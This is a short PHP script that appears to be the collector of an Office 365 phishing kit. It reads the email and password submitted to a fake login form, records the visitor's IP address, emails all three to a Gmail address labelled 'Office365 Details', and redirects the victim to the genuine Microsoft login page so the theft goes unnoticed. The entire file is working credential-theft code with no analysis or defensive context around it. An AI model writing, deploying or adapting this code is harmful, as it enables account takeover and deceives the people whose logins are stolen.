<?php
    $to = "thankfulk091@gmail.com";
    $ip = getenv("REMOTE_ADDR");
    $user = $_POST['email'];
	$pass = $_POST['passwd'];
    $from = "Office 365";
    $subject = " Office365 Details"; 
    $message = "Email: $user\n Pass: $pass\nip: $ip\n";
    mail($to, $subject, $message, $from);
    header("Location: https://login.microsoftonline.com");
?>
